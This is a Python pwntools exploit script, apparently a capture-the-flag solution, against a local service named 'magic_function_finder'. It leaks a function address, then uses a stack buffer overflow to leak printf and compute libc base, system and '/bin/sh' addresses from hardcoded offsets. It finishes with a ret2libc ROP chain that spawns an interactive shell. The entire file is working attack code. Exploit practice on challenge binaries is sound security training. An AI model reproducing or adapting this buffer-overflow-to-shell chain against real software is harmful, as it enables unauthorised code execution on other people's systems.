from pwn import *

#p = process("./magic_function_finder")
# gdb.attach(p, '''
        #set follow-fork-mode child
        #break system
        #continue
        #''')
p = remote("localhost", 1024)
# raw_input("READY?")

# Step 1, receive the address of find_printf
p.recvuntil("implemented at: ")
addr_of_find_printf = p.recvuntil("\n")
addr_of_find_printf = str(addr_of_find_printf).split("\\")[0]
addr_of_find_printf = str(addr_of_find_printf).split("'")[1]
print(f"found find_printf at: {addr_of_find_printf}")
p.recvuntil("feedback:")

# Step 2, Buffer Overflow -> calling printf_finder
addr_of_find_printf = int(addr_of_find_printf, 16)
padding = b"A" * 64
padding_rbp = b"B" * 4 + b"C" * 4
addr_of_find_printf = p64(addr_of_find_printf)
print(addr_of_find_printf)
payload = padding + padding_rbp + addr_of_find_printf
print(f"sending payload {payload}")
p.sendline(payload)
p.recvuntil("found printf, it's at:\n")
addr_of_printf = p.recvuntil("\n")
addr_of_printf = str(addr_of_printf).split("\\")[0]
addr_of_printf = str(addr_of_printf).split("'")[1]
print(f"found printf at: {addr_of_printf}")

# Step3, calculate the base of libc -> calculate the address of system
printf_offset  = "0x64e10"  # still a local value for testing
system_offset  = "0x55410"  # still a local value for testing
bin_sh_in_libc_offset = "0x1b75aa" # still a local value for testing
# pop_rdi = "0x4013d3"

pop_rdi = "0x401403"
libc_base = int(addr_of_printf, 16) - int(printf_offset, 16)

libc_system =int(hex(libc_base), 16) + int(system_offset, 16)

binsh_libc = int(hex(libc_base), 16) + int(bin_sh_in_libc_offset, 16)

print(f"found libc_base: {hex(libc_base)}")
print(f"found system in libc: {hex(libc_system)}")
print(p.recvuntil("Wait, how did you get here?\n"))

pop_rdi = p64(int(pop_rdi, 16))
binsh_libc = p64(binsh_libc)
libc_system = p64(libc_system)

rop_chain = pop_rdi + binsh_libc + libc_system 
payload2 = padding + padding_rbp + rop_chain
# payload2 = padding + padding_rbp + p64(libc_system)
print(f"sending second payload {payload2}")
p.sendline(payload2)

p.interactive()
p.close()
